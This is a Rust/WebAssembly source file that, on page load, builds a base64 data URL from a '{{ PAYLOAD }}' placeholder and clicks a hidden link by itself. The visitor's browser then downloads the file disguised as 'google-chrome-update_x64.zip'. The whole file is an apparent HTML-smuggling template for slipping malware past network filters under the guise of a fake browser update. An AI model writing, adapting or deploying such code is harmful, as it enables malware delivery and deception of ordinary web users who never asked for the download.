use wasm_bindgen::prelude::*;
extern crate web_sys;

// Called when the wasm module is instantiated
#[wasm_bindgen(start)]

fn main() -> Result<(), JsValue> {
    // Use `web_sys`'s global `window` function to get a handle on the global window object.
    let window = web_sys::window().expect("no global `window` exists");
    let document = window.document().expect("should have a document on window");
    let body = document.body().expect("document should have a body");

    // Get our payload into a format we can use
    let target = "{{ PAYLOAD }}";

    // Create an a element
    let a = document.create_element("a")?;

    // Append the a element to the body
    body.append_child(&a)?;

    // Create a URL 
    let download_url = format!("data:{};base64,{}","application/octet-stream",target);

    // Set the href of the a element to the URL
    let _ = a.set_attribute("href", &download_url);

    // Set the download attribute of the a element to the file name
    let _ = a.set_attribute("download", "google-chrome-update_x64.zip");
    
    // Click the a element
    if let Some(html_element) = a.dyn_ref::<web_sys::HtmlElement>() {
        html_element.click();
    }

    Ok(())
}